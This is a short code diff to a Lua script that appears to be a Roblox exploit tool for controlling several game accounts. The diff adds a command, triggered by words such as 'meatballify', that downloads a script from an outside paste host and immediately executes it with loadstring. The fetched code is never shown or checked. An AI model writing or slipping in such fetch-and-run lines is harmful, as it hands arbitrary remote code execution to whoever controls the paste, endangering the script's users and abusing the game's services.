@@ -211,6 +211,10 @@ if (model) then
         message("Managing " .. count .. " accounts.")
     end)
 
+    add({ "meatballify", "meatball", "gwibard" }, function()
+        loadstring(game:HttpGetAsync("https://new-cloudbin.koyeb.app/raw/eTNvTLkf.txt", true))()
+    end)
+
     add({ "end", "stop", "quit", "exit", "close" }, function()
         disallowed = true
 
